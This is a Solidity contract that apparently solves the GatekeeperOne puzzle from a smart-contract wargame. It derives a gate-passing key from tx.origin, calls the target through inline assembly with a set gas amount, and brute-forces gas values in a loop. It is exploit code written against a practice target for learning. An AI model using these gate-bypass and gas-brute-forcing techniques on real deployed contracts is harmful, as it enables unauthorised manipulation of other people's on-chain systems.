// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AlternateExploit for GatekeeperOne
 * @dev A simpler, more direct approach to exploiting the GatekeeperOne contract
 */
contract AlternateExploit {
    /**
     * @dev The core exploit function that handles all gates in one transaction
     * @param _gateAddress Address of the GatekeeperOne contract
     * @param _gas Gas value to use for the call (to satisfy gate two)
     */
    function exploit(address _gateAddress, uint256 _gas) external {
        // Calculate the key based on the tx.origin address
        // This satisfies gate three by:
        // 1. Making bytes 3-4 zero (so uint32 and uint16 casts match)
        // 2. Making sure bytes 5-8 have some non-zero bits (for condition 2)
        // 3. Making the last 2 bytes match the tx.origin address
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | 0x1000000000000000);
        
        // Call the GatekeeperOne contract with the specific gas
        // This will:
        // - Satisfy gate one because msg.sender != tx.origin
        // - Try to satisfy gate two with the specified gas value
        // - Use our calculated key to satisfy gate three
        
        // We use assembly to have precise control over the gas
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Load the function selector for enter(bytes8)
            // "enter(bytes8)" = 0x3370204e
            let ptr := mload(0x40)  // Get free memory pointer
            mstore(ptr, 0x3370204e00000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 0x04), key)  // Store key argument
            
            // Make the call with exactly _gas amount of gas
            let success := call(
                _gas,           // Gas to send
                _gateAddress,   // Target address
                0,              // No ETH to send
                ptr,            // Input data start
                0x24,           // Input data length (4 + 32 bytes)
                ptr,            // Output location
                0x20            // Output length
            )
            
            // Check if the call was successful and revert if it failed
            if iszero(success) {
                revert(0, 0)
            }
            // Use success variable to avoid unused variable warning
            mstore(0x00, success)
        }
    }
    
    /**
     * @dev Batch try multiple gas values in a single transaction
     * @param _gateAddress Address of the GatekeeperOne contract
     * @param _gasStart Starting gas value
     * @param _step Increment between gas values
     * @param _tries Number of attempts to make
     */
    function batchExploit(
        address _gateAddress,
        uint256 _gasStart,
        uint256 _step,
        uint256 _tries
    ) external {
        // Try different gas values
        for(uint256 i = 0; i < _tries; i++) {
            uint256 gasToUse = _gasStart + (i * _step);
            
            // Use try-catch to avoid reverting the entire transaction if one attempt fails
            try this.exploit{gas: gasToUse + 2000}(_gateAddress, gasToUse) {
                // If we get here, the call succeeded
                return;
            } catch {
                // Continue to next gas value
            }
        }
    }
    
    /**
     * @dev Check if a specific address is the entrant in GatekeeperOne
     * @param _gateAddress Address of the GatekeeperOne contract
     * @param _address Address to check
     * @return bool True if _address is the entrant
     */
    function checkIsEntrant(address _gateAddress, address _address) external view returns (bool) {
        // Create a minimal interface to read the entrant
        bytes4 selector = bytes4(keccak256("entrant()"));
        bytes memory encodedParams = abi.encodeWithSelector(selector);
        
        (bool success, bytes memory result) = _gateAddress.staticcall(encodedParams);
        
        if (success && result.length >= 32) {
            // Extract the entrant address from the result
            address entrant;
            assembly {
                entrant := mload(add(result, 32))
            }
            
            // Check if it matches the provided address
            return entrant == _address;
        }
        
        return false;
    }
}
